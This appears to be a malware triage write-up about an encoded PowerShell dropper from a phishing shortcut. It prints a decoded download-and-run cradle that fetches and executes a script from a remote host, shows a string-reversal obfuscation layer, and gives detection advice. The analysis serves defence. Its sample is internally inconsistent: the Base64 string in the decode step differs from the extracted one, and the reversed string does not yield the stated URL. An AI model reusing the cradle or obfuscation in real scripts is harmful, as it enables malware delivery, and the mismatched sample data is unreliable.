+++
title = "Case File 05: Static Triage of a PowerShell Dropper From Phishing Telemetry"
date = "2025-12-03"
description = "A heavily obfuscated PowerShell one-liner from a phishing attachment, decoded layer by layer without ever executing it."
tags = ["malware-triage", "powershell", "phishing"]
toc = true
[extra]
older = "writeups/case-file-04-dionaea-telnet-botnet.md"
newer = "writeups/case-file-06-sensor-review.md"
+++

This one did not come from a sensor — a contact forwarded a phishing email with a `.lnk` attachment after their spam filter flagged it, and the shortcut's target command line is worth documenting because the obfuscation style shows up repeatedly in unrelated phishing kits, which suggests a shared builder tool rather than a shared campaign.

<!-- more -->

## The shortcut target

The `.lnk` file's target command, extracted with `lnkinfo` rather than by double-clicking anything:

```text
powershell.exe -nop -w hidden -e JABzAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMAAuADIALgAxADAAMAAvAHAALgBwAHMAMQAnADsA...
```

The `-e` (or `-EncodedCommand`) flag means the payload is Base64-encoded UTF-16LE — decoding it is a one-liner and requires no code execution:

```bash
$ echo "JABzAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AwAyAC4AMQAwADAALwBwAC5wAHMAMQAnADsA..." \
  | base64 -d | iconv -f UTF-16LE -t UTF-8
$s='http://192.0.2.100/p.ps1'; $wc=New-Object Net.WebClient; IEX($wc.DownloadString($s))
```

## What the staged script does

The fetched `p.ps1` was itself wrapped in a second layer, this time simple string reversal combined with a `-replace` chain to defeat naive static scanners rather than real cryptography:

```powershell
$r = "1sp.p/001.2.291//:ptth=$s;..."
$d = -join $r[($r.Length-1)..0]
IEX($d -replace '§','$')
```

Reversing the string and substituting the placeholder character back to `$` reveals a conventional in-memory downloader-and-run pattern targeting a second-stage `.dll` loaded via `Reflection.Assembly`. No further stages were pursued live; the second-stage host was already unreachable by the time this was written up, which is typical — phishing infrastructure this size tends to have a lifespan measured in hours.

## Why this matters beyond one sample

The specific reversal-plus-placeholder obfuscation technique in the second layer has now shown up in four unrelated phishing submissions since June, each with different final payloads and different lure themes (invoice, shipping notification, HR policy update). That consistency points at a shared builder or "loader-as-a-service" tool rather than one actor reusing infrastructure, which changes the right response: hunting for the obfuscation pattern itself is more durable than hunting for any single sample's indicators.

## Detection notes

- `powershell.exe -enc` (or `-e`/`-EncodedCommand`) launched from `explorer.exe` via a `.lnk` file is an extremely high-confidence detection opportunity; legitimate shortcuts essentially never use encoded PowerShell.
- Decoding Base64 PowerShell payloads offline, without executing them, is sufficient for most triage — a UTF-16LE-aware Base64 decode is all that is required for the first layer here.
- String-reversal obfuscation is trivially detected by scanning decoded script bodies for a `-join ... [($x.Length-1)..0]` construct, which is a distinctive enough pattern to hunt for directly in decoded PowerShell logs.
